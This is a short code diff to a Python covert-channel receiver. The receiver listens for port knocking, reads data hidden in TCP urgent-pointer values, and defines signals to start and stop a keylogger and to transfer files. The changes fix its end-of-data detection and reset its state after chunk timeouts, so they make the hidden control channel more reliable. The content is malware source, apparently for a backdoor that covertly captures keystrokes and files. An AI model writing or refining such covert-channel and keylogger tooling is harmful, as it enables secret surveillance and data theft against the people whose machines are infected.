@@ -28,7 +28,7 @@ local_ip = get_local_ip()
 source_port = 80
 dest_port = 80
 received_data = ""
-eof_signal = "\x00"
+eof_signal = 65535
 keylogger_start_signal = 1
 keylogger_stop_signal = 2
 file_transfer_signal = 3
@@ -93,7 +93,10 @@ def reset_chunk_timer():
     chunk_timer.start()
 
 def handle_chunk_timeout():
+    global received_data, received_chunks
     print("Timeout: Did not receive the next chunk in time.")
+    received_data = ""
+    received_chunks = 0
     reset_state()
     wait_for_port_knocking()
 
@@ -120,8 +123,8 @@ def signal_callback(packet):
         received_chunks += 1
         print(f"Received chunk #{received_chunks}: {urgent_pointer_value}")
         print(f"Current data: {received_data}")
-                
-        if received_data.endswith(eof_signal):
+
+        if urgent_pointer_value == eof_signal:
             print(f"EOF marker detected. Total chunks received: {received_chunks}")
             try:
                 data_to_process = received_data[:-2]
